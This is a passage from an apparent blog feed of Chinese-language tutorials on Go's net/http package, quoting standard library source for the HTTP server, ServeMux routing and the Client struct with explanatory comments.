punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> srv<span class="token punctuation">.</span><span class="token function">shuttingDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> ErrServerClosed    <span class="token punctuation">}</span>    addr <span class="token operator">:=</span> srv<span class="token punctuation">.</span>Addr       <span class="token keyword">if</span> addr <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">{</span>        addr <span class="token operator">=</span> <span class="token string">":http"</span>   <span class="token comment" spellcheck="true">//若没传入监听的地址和端口，默认在所有地址监听80端口。</span>    <span class="token punctuation">}</span>    ln<span class="token punctuation">,</span> err <span class="token operator">:=</span> net<span class="token punctuation">.</span><span class="token function">Listen</span><span class="token punctuation">(</span><span class="token string">"tcp"</span><span class="token punctuation">,</span> addr<span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> err    <span class="token punctuation">}</span>    <span class="token keyword">return</span> srv<span class="token punctuation">.</span><span class="token function">Serve</span><span class="token punctuation">(</span>ln<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul><ul><li><p><strong><code>*Server.Serve()</code></strong></p><p>  接收客户端的连接请求，将每个<code>TCP</code>连接封装到<code>conn</code>结构体中，并分配单独的<code>goroutine</code>处理每个TCP连接。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// Serve accepts incoming connections on the Listener l, creating a new service goroutine for each. </span><span class="token comment" spellcheck="true">// The service goroutines read requests and then call srv.Handler to reply to them.</span><span class="token keyword">func</span> <span class="token punctuation">(</span>srv <span class="token operator">*</span>Server<span class="token punctuation">)</span> <span class="token function">Serve</span><span class="token punctuation">(</span>l net<span class="token punctuation">.</span>Listener<span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">{</span>    <span class="token operator">...</span><span class="token operator">...</span>    ctx <span class="token operator">:=</span> context<span class="token punctuation">.</span><span class="token function">WithValue</span><span class="token punctuation">(</span>baseCtx<span class="token punctuation">,</span> ServerContextKey<span class="token punctuation">,</span> srv<span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">{</span>        rw<span class="token punctuation">,</span> err <span class="token operator">:=</span> l<span class="token punctuation">.</span><span class="token function">Accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//持续接收TCP连接请求。</span>        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>            <span class="token operator">...</span><span class="token operator">...</span>            <span class="token keyword">return</span> err        <span class="token punctuation">}</span>        connCtx <span class="token operator">:=</span> ctx        <span class="token operator">...</span><span class="token operator">...</span>        c <span class="token operator">:=</span> srv<span class="token punctuation">.</span><span class="token function">newConn</span><span class="token punctuation">(</span>rw<span class="token punctuation">)</span>        c<span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>rwc<span class="token punctuation">,</span> StateNew<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// before Serve can return</span>        <span class="token keyword">go</span> c<span class="token punctuation">.</span><span class="token function">serve</span><span class="token punctuation">(</span>connCtx<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Create new connection from rwc.</span><span class="token keyword">func</span> <span class="token punctuation">(</span>srv <span class="token operator">*</span>Server<span class="token punctuation">)</span> <span class="token function">newConn</span><span class="token punctuation">(</span>rwc net<span class="token punctuation">.</span>Conn<span class="token punctuation">)</span> <span class="token operator">*</span>conn <span class="token punctuation">{</span>    c <span class="token operator">:=</span> <span class="token operator">&amp;</span>conn<span class="token punctuation">{</span>        server<span class="token punctuation">:</span> srv<span class="token punctuation">,</span>        rwc<span class="token punctuation">:</span>    rwc<span class="token punctuation">,</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> debugServerConnections <span class="token punctuation">{</span>        c<span class="token punctuation">.</span>rwc <span class="token operator">=</span> <span class="token function">newLoggingConn</span><span class="token punctuation">(</span><span class="token string">"server"</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span>rwc<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> c<span class="token punctuation">}</span></code></pre></li></ul><ul><li><p><strong><code>*conn.serve()</code></strong></p><p>  每个goroutine执行的函数，读取<code>HTTP Request</code>，调用<code>Handler</code>处理。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// Serve a new connection.</span><span class="token keyword">func</span> <span class="token punctuation">(</span>c <span class="token operator">*</span>conn<span class="token punctuation">)</span> <span class="token function">serve</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token operator">...</span><span class="token operator">...</span>    ctx<span class="token punctuation">,</span> cancelCtx <span class="token operator">:=</span> context<span class="token punctuation">.</span><span class="token function">WithCancel</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span>    c<span class="token punctuation">.</span>cancelCtx <span class="token operator">=</span> cancelCtx    <span class="token keyword">defer</span> <span class="token function">cancelCtx</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token operator">...</span><span class="token operator">...</span>    <span class="token keyword">for</span> <span class="token punctuation">{</span>        w<span class="token punctuation">,</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">readRequest</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span>        <span class="token operator">...</span><span class="token operator">...</span>        <span class="token comment" spellcheck="true">// Expect 100 Continue support</span>        req <span class="token operator">:=</span> w<span class="token punctuation">.</span>req        <span class="token operator">...</span><span class="token operator">...</span>        serverHandler<span class="token punctuation">{</span>c<span class="token punctuation">.</span>server<span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token function">ServeHTTP</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> w<span class="token punctuation">.</span>req<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//将Server封装到serverHandler结构体中。</span>        w<span class="token punctuation">.</span><span class="token function">cancelCtx</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token operator">...</span><span class="token operator">...</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul><ul><li><p><strong><code>*conn.readRequest()</code></strong></p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// Read next request from connection.</span><span class="token keyword">func</span> <span class="token punctuation">(</span>c <span class="token operator">*</span>conn<span class="token punctuation">)</span> <span class="token function">readRequest</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">(</span>w <span class="token operator">*</span>response<span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token operator">...</span><span class="token operator">...</span>    req<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">readRequest</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>bufr<span class="token punctuation">,</span> keepHostHeader<span class="token punctuation">)</span>    <span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">.</span>    w <span class="token operator">=</span> <span class="token operator">&amp;</span>response<span class="token punctuation">{</span>        conn<span class="token punctuation">:</span>          c<span class="token punctuation">,</span>        cancelCtx<span class="token punctuation">:</span>     cancelCtx<span class="token punctuation">,</span>        req<span class="token punctuation">:</span>           req<span class="token punctuation">,</span>        reqBody<span class="token punctuation">:</span>       req<span class="token punctuation">.</span>Body<span class="token punctuation">,</span>        handlerHeader<span class="token punctuation">:</span> <span class="token function">make</span><span class="token punctuation">(</span>Header<span class="token punctuation">)</span><span class="token punctuation">,</span>        contentLength<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>        closeNotifyCh<span class="token punctuation">:</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">bool</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// We populate these ahead of time so we're not</span>        <span class="token comment" spellcheck="true">// reading from req.Header after their Handler starts</span>        <span class="token comment" spellcheck="true">// and maybe mutates it (Issue 14940)</span>        wants10KeepAlive<span class="token punctuation">:</span> req<span class="token punctuation">.</span><span class="token function">wantsHttp10KeepAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        wantsClose<span class="token punctuation">:</span>       req<span class="token punctuation">.</span><span class="token function">wantsClose</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> isH2Upgrade <span class="token punctuation">{</span>        w<span class="token punctuation">.</span>closeAfterReply <span class="token operator">=</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span>    w<span class="token punctuation">.</span>cw<span class="token punctuation">.</span>res <span class="token operator">=</span> w    w<span class="token punctuation">.</span>w <span class="token operator">=</span> <span class="token function">newBufioWriterSize</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>w<span class="token punctuation">.</span>cw<span class="token punctuation">,</span> bufferBeforeChunkingSize<span class="token punctuation">)</span>    <span class="token keyword">return</span> w<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">}</span></code></pre></li></ul><ul><li><p><strong><code>serverHandler.ServeHTTP()</code></strong></p><p>  函数最终会调用到<code>Server.Handler</code>的<code>ServerHTTP()</code>，如果在创建<code>Server</code>时没有传入<code>Handler</code>，那么默认会使用<code>DefaultServeMux</code>作为<code>Handler</code>。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> serverHandler <span class="token keyword">struct</span> <span class="token punctuation">{</span>    srv <span class="token operator">*</span>Server<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>sh serverHandler<span class="token punctuation">)</span> <span class="token function">ServeHTTP</span><span class="token punctuation">(</span>rw ResponseWriter<span class="token punctuation">,</span> req <span class="token operator">*</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    handler <span class="token operator">:=</span> sh<span class="token punctuation">.</span>srv<span class="token punctuation">.</span>Handler    <span class="token keyword">if</span> handler <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        handler <span class="token operator">=</span> DefaultServeMux    <span class="token punctuation">}</span>    <span class="token keyword">if</span> req<span class="token punctuation">.</span>RequestURI <span class="token operator">==</span> <span class="token string">"*"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>Method <span class="token operator">==</span> <span class="token string">"OPTIONS"</span> <span class="token punctuation">{</span>        handler <span class="token operator">=</span> globalOptionsHandler<span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    handler<span class="token punctuation">.</span><span class="token function">ServeHTTP</span><span class="token punctuation">(</span>rw<span class="token punctuation">,</span> req<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul><h2 id="三、ServeMux"><a href="#三、ServeMux" class="headerlink" title="三、ServeMux"></a>三、ServeMux</h2><p>一个URL通常对应使用一个<code>Handler</code>处理，<code>ServeMux</code>可以认为是用来管理多个<code>URL</code>与多个<code>Handler</code>的对应关系。</p><p>具体实现为：<code>ServerMux</code>实现了<code>Handler</code>接口，每个<code>HTTP Request</code>实际上都会调用<code>ServerMux</code>的<code>ServeHTTP()</code>方法处理请求。然后<code>ServeMux</code>的<code>ServeHTTP()</code>函数会再将请求分发给具体对应的<code>Handler</code>处理。</p><p>因此，可以从两方面理解<code>ServeMux</code>:</p><ul><li><p><strong><code>URL</code>和<code>Handler</code>绑定</strong></p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> ServeMux <span class="token keyword">struct</span> <span class="token punctuation">{</span>    mu    sync<span class="token punctuation">.</span>RWMutex    m     <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>muxEntry    es    <span class="token punctuation">[</span><span class="token punctuation">]</span>muxEntry <span class="token comment" spellcheck="true">// slice of entries sorted from longest to shortest.</span>    hosts <span class="token builtin">bool</span>       <span class="token comment" spellcheck="true">// whether any patterns contain hostnames</span><span class="token punctuation">}</span><span class="token keyword">type</span> muxEntry <span class="token keyword">struct</span> <span class="token punctuation">{</span>    h       Handler    pattern <span class="token builtin">string</span><span class="token punctuation">}</span></code></pre><ul><li><p><code>func Handle(pattern string, handler Handler)</code></p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// Handle registers the handler for the given pattern</span><span class="token comment" spellcheck="true">// in the DefaultServeMux.</span><span class="token comment" spellcheck="true">// The documentation for ServeMux explains how patterns are matched.</span><span class="token keyword">func</span> <span class="token function">Handle</span><span class="token punctuation">(</span>pattern <span class="token builtin">string</span><span class="token punctuation">,</span> handler Handler<span class="token punctuation">)</span> <span class="token punctuation">{</span> DefaultServeMux<span class="token punctuation">.</span><span class="token function">Handle</span><span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> handler<span class="token punctuation">)</span> <span class="token punctuation">}</span></code></pre></li><li><p><code>func HandleFunc(pattern string, handler func(ResponseWriter, *Request)) </code></p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// HandleFunc registers the handler function for the given pattern</span><span class="token comment" spellcheck="true">// in the DefaultServeMux.</span><span class="token comment" spellcheck="true">// The documentation for ServeMux explains how patterns are matched.</span><span class="token keyword">func</span> <span class="token function">HandleFunc</span><span class="token punctuation">(</span>pattern <span class="token builtin">string</span><span class="token punctuation">,</span> handler <span class="token keyword">func</span><span class="token punctuation">(</span>ResponseWriter<span class="token punctuation">,</span> <span class="token operator">*</span>Request<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    DefaultServeMux<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// HandleFunc registers the handler function for the given pattern.</span><span class="token keyword">func</span> <span class="token punctuation">(</span>mux <span class="token operator">*</span>ServeMux<span class="token punctuation">)</span> <span class="token function">HandleFunc</span><span class="token punctuation">(</span>pattern <span class="token builtin">string</span><span class="token punctuation">,</span> handler <span class="token keyword">func</span><span class="token punctuation">(</span>ResponseWriter<span class="token punctuation">,</span> <span class="token operator">*</span>Request<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> handler <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"http: nil handler"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    mux<span class="token punctuation">.</span><span class="token function">Handle</span><span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> <span class="token function">HandlerFunc</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//将handler强制转换为HandlerFunc类型，而HandlerFunc实现了Handler。</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// HandlerFunc实现了Handler</span><span class="token keyword">type</span> HandlerFunc <span class="token keyword">func</span><span class="token punctuation">(</span>ResponseWriter<span class="token punctuation">,</span> <span class="token operator">*</span>Request<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// ServeHTTP calls f(w, r).</span><span class="token keyword">func</span> <span class="token punctuation">(</span>f HandlerFunc<span class="token punctuation">)</span> <span class="token function">ServeHTTP</span><span class="token punctuation">(</span>w ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">f</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><ul><li><p><code>func (mux *ServeMux) Handle(pattern string, handler Handler)</code></p><p>  该函数是会把<code>URL</code>和<code>Handler</code>绑定到一个<code>map</code>中，<code>map</code>键为<code>URL</code>，值为一个结构体（结构体存储了<code>URL</code>和<code>Handler</code>）。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// Handle registers the handler for the given pattern.</span><span class="token comment" spellcheck="true">// If a handler already exists for pattern, Handle panics.</span><span class="token keyword">func</span> <span class="token punctuation">(</span>mux <span class="token operator">*</span>ServeMux<span class="token punctuation">)</span> <span class="token function">Handle</span><span class="token punctuation">(</span>pattern <span class="token builtin">string</span><span class="token punctuation">,</span> handler Handler<span class="token punctuation">)</span> <span class="token punctuation">{</span>    mux<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">defer</span> mux<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> pattern <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">{</span>        <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"http: invalid pattern"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> handler <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"http: nil handler"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token boolean">_</span><span class="token punctuation">,</span> exist <span class="token operator">:=</span> mux<span class="token punctuation">.</span>m<span class="token punctuation">[</span>pattern<span class="token punctuation">]</span><span class="token punctuation">;</span> exist <span class="token punctuation">{</span>        <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"http: multiple registrations for "</span> <span class="token operator">+</span> pattern<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> mux<span class="token punctuation">.</span>m <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        mux<span class="token punctuation">.</span>m <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>muxEntry<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    e <span class="token operator">:=</span> muxEntry<span class="token punctuation">{</span>h<span class="token punctuation">:</span> handler<span class="token punctuation">,</span> pattern<span class="token punctuation">:</span> pattern<span class="token punctuation">}</span>    mux<span class="token punctuation">.</span>m<span class="token punctuation">[</span>pattern<span class="token punctuation">]</span> <span class="token operator">=</span> e    <span class="token keyword">if</span> pattern<span class="token punctuation">[</span><span class="token function">len</span><span class="token punctuation">(</span>pattern<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'/'</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//  /path/</span>        mux<span class="token punctuation">.</span>es <span class="token operator">=</span> <span class="token function">appendSorted</span><span class="token punctuation">(</span>mux<span class="token punctuation">.</span>es<span class="token punctuation">,</span> e<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> pattern<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'/'</span> <span class="token punctuation">{</span>        mux<span class="token punctuation">.</span>hosts <span class="token operator">=</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul></li><li><p>分发每个<code>HTTP Request</code>到具体对应的<code>Handler</code>。</p><ul><li><p><code>func (mux *ServeMux) ServeHTTP(w ResponseWriter, r *Request)</code></p><p>  对于每个请求，<code>Serve</code>实际调用到的是该方法，而该方法会对请求再次进行分发。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// ServeHTTP dispatches the request to the handler whose</span><span class="token comment" spellcheck="true">// pattern most closely matches the request URL.</span><span class="token keyword">func</span> <span class="token punctuation">(</span>mux <span class="token operator">*</span>ServeMux<span class="token punctuation">)</span> <span class="token function">ServeHTTP</span><span class="token punctuation">(</span>w ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>RequestURI <span class="token operator">==</span> <span class="token string">"*"</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span><span class="token function">ProtoAtLeast</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            w<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Connection"</span><span class="token punctuation">,</span> <span class="token string">"close"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span>StatusBadRequest<span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span>    h<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> mux<span class="token punctuation">.</span><span class="token function">Handler</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>    h<span class="token punctuation">.</span><span class="token function">ServeHTTP</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><ul><li><p><code>func (mux *ServeMux) Handler(r *Request) (h Handler, pattern string)</code></p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>mux <span class="token operator">*</span>ServeMux<span class="token punctuation">)</span> <span class="token function">Handler</span><span class="token punctuation">(</span>r <span class="token operator">*</span>Request<span class="token punctuation">)</span> <span class="token punctuation">(</span>h Handler<span class="token punctuation">,</span> pattern <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token operator">...</span><span class="token operator">...</span>    <span class="token keyword">return</span> mux<span class="token punctuation">.</span><span class="token function">handler</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>Path<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li><li><p><code>func (mux *ServeMux) handler(host, path string) (h Handler, pattern string)</code></p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// handler is the main implementation of Handler.</span><span class="token comment" spellcheck="true">// The path is known to be in canonical form, except for CONNECT methods.</span><span class="token keyword">func</span> <span class="token punctuation">(</span>mux <span class="token operator">*</span>ServeMux<span class="token punctuation">)</span> <span class="token function">handler</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> path <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>h Handler<span class="token punctuation">,</span> pattern <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    mux<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">RLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">defer</span> mux<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">RUnlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// Host-specific pattern takes precedence over generic ones</span>    <span class="token keyword">if</span> mux<span class="token punctuation">.</span>hosts <span class="token punctuation">{</span>        h<span class="token punctuation">,</span> pattern <span class="token operator">=</span> mux<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>host <span class="token operator">+</span> path<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> h <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        h<span class="token punctuation">,</span> pattern <span class="token operator">=</span> mux<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> h <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        h<span class="token punctuation">,</span> pattern <span class="token operator">=</span> <span class="token function">NotFoundHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">""</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">}</span></code></pre><ul><li><p><code>func (mux *ServeMux) match(path string) (h Handler, pattern string)</code></p><p>  根据<code>URL</code>查找对应的<code>Handler</code>。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// Find a handler on a handler map given a path string.</span><span class="token comment" spellcheck="true">// Most-specific (longest) pattern wins.</span><span class="token keyword">func</span> <span class="token punctuation">(</span>mux <span class="token operator">*</span>ServeMux<span class="token punctuation">)</span> <span class="token function">match</span><span class="token punctuation">(</span>path <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>h Handler<span class="token punctuation">,</span> pattern <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Check for exact match first.</span>    v<span class="token punctuation">,</span> ok <span class="token operator">:=</span> mux<span class="token punctuation">.</span>m<span class="token punctuation">[</span>path<span class="token punctuation">]</span>    <span class="token keyword">if</span> ok <span class="token punctuation">{</span>        <span class="token keyword">return</span> v<span class="token punctuation">.</span>h<span class="token punctuation">,</span> v<span class="token punctuation">.</span>pattern    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Check for longest valid match.  mux.es contains all patterns</span>    <span class="token comment" spellcheck="true">// that end in / sorted from longest to shortest.</span>    <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> e <span class="token operator">:=</span> <span class="token keyword">range</span> mux<span class="token punctuation">.</span>es <span class="token punctuation">{</span>        <span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">HasPrefix</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> e<span class="token punctuation">.</span>pattern<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> e<span class="token punctuation">.</span>h<span class="token punctuation">,</span> e<span class="token punctuation">.</span>pattern        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go Package </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go Package—net\http(Part I：Client)</title>
      <link href="2020/10/30/Go-Package%E2%80%94net-http-Part1-Client/"/>
      <url>2020/10/30/Go-Package%E2%80%94net-http-Part1-Client/</url>
      
        <content type="html"><![CDATA[<h2 id="一、http-Client"><a href="#一、http-Client" class="headerlink" title="一、http.Client"></a>一、http.Client</h2><p><code>net\http</code>包提供<code>Client</code>结构体来实现<code>HTTP</code>客户端功能。</p><p><strong>Transport</strong></p><p><code>Transport</code>是真正用于网络通信的，包括建立<code>TCP</code>连接、建立<code>TLS</code>连接、发送HTTP Request等。</p><p>通常<code>Transport</code>都实现了<code>TCP</code>链接缓存功能，因此应该重用一个<code>Client</code>，而不是每发一个HTTP Request都要创建一个<code>Client</code>。</p><p><code>Client</code>是线程安全的，不用担心多个<code>goroutine</code>使用同一个<code>Client</code>会造成问题。</p><p><strong>CheckRedirct</strong></p><p><code>CheckRedirect</code>用来处理重定向跳转的情况，在进行重定向前，该函数会被调用。</p><p><strong>Jar</strong></p><p><code>Jar</code>用于处理<code>Cookie</code>，包括在发送HTTP Reuqest时插入对应的<code>Cookie</code>,以及存储更新<code>HTTP Response</code>返回的<code>Set-Cookie</code>的值。</p><p><strong>Timeout</strong></p><p><code>Timeout</code>用于设置超时时间。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> Client <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Transport specifies the mechanism by which individual HTTP requests are made.</span>    <span class="token comment" spellcheck="true">// If nil, DefaultTransport is used.</span>    Transport RoundTripper    <span class="token comment" spellcheck="true">// CheckRedirect specifies the policy for handling redirects.</span>    <span class="token comment" spellcheck="true">// If CheckRedirect is not nil, the client calls it before following an HTTP redirect. </span>    <span class="token comment" spellcheck="true">// The arguments req and via are the upcoming request and the requests made already, oldest first. </span>    <span class="token comment" spellcheck="true">// If CheckRedirect is nil, the Client uses its default policy,which is to stop after 10 consecutive requests.</span>    CheckRedirect <span class="token keyword">func</span><span class="token punctuation">(</span>req <span class="token operator">*</span>Request<span class="token punctuation">,</span> via <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>Request<span class="token punctuation">)</span> <span class="token builtin">error</span>    <span class="token comment" spellcheck="true">// Jar specifies the cookie jar.</span>    <span class="token comment" spellcheck="true">// The Jar is used to insert relevant cookies into every</span>    <span class="token comment" spellcheck="true">// outbound Request and is updated with the cookie values</span>    <span class="token comment" spellcheck="true">// of every inbound Response.</span>    <span class="token comment" spellcheck="true">// The Jar is consulted for every redirect that the Client follows.</span>    <span class="token comment" spellcheck="true">// If Jar is nil, cookies are only sent if they are explicitly set on the Request.</span>    Jar CookieJar    <span class="token comment" spellcheck="true">// Timeout specifies a time limit for requests made by this Client. </span>    <span class="token comment" spellcheck="true">// The timeout includes connection time, any redirects, and reading the response body. </span>    <span class="token comment" spellcheck="true">// The timer remains running after Get, Head, Post, or Do return and will interrupt reading of the 